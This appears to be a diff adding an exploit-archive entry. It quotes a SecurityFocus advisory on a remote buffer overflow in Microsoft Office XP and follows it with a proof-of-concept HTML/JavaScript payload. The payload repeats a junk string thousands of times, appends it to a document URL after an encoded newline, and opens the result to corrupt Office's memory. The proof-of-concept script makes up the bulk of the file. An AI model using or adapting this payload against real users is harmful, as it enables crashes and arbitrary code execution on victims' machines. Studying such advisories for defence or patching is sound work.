@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/12480/info
+
+A remote buffer overflow vulnerability affects Microsoft Office XP. The problem presents itself when an unsuspecting user follows a malicious HTML link that points to a Office document. A boundary condition error is exposed during this operation that may allow attacker-specified data to corrupt process memory.
+
+An attacker may leverage this issue to execute arbitrary code with the privileges of an unsuspecting user that follows a malicious embedded link.
+
+<Script>
+var mylongstring,myjunk;
+mylongstring ="";
+myjunk="bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+bbbbbbbbbbbbbbbbbbb";
+for(c=1;c<5000;c++)
+{
+mylongstring = mylongstring + myjunk;
+}
+window.open("http://www.hhs.gov/ocr/privacysummary.rtf%0a"+mylongstring);
+</script> 
